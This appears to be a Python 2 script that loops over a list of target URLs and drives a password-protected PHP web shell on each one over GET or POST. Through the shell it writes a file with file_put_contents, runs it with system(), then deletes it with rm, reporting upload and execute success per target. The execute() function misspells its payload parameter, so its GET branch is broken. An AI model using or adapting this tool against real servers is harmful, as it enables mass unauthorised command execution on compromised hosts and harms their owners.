#encoding:utf-8
import requests
import string

def upload_file(target,method,password,payload):
	if method == "get":
		url = target + "?" + password + "=" + payload
		response = requests.get(url)
		if response.status_code == 200:
			print response.text
			return True
		return response.status_code
	if method == "post":
		payload = {password:payload}
		url = target
		response = requests.post(url,data=payload)
		if response.status_code == 200:
			print response.text
			return True
		return response.status_code

def execute(target,method,password,paylaod):
	if method == "get":
		url = target + "?" + password + "=" + payload
		response = requests.get(url)
		if response.status_code == 200:
			print response.text
			return True
		return response.status_code
	if method == "post":
		payload = {password:paylaod}
		url = target
		response = requests.post(url,data=payload)
		if response.status_code == 200:
			print response.text
			return True
		return response.status_code

def main():
	targetlist = []
	with open("target.txt","r") as ft:
		for line in ft.readlines():
			targetlist.append(line.strip('\r\n'))
	print "[+]-----------------------------------------------[+]"
	print "[+] Choose shell method GET/POST!"
	method = raw_input("GET/POST\n")
	print "[+] Input shell passwd!"
	passwd = raw_input("password\n")

	payload_upload = "file_put_contents(\"echo.php\",\"<?php echo 888888;?>\");"
	payload_execute = "system(\"php -f echo.php\");system(\"rm echo.php\");"

	if string.lower(method) == 'get':
		method = 'get'
	if string.lower(method) == 'post':
		method = 'post'
	for target in targetlist:
		print "[+] Testing target: %s" % target
		result = upload_file(target,method,passwd,payload_upload)
		if result == True:
			print "[+] %s Upload success!" % target
			exe_re = execute(target,method,passwd,payload_execute)
			if exe_re == True:
				print "[+] %s Execute success!" % target
			else:
				print "[+] Execute failed, Error code: %d" % exe_re
		else:
			print "[+] Upload failed, Error code: %d" % result
		print "[+]-----------------------------------------------[+]"
if __name__ == '__main__':
	main()




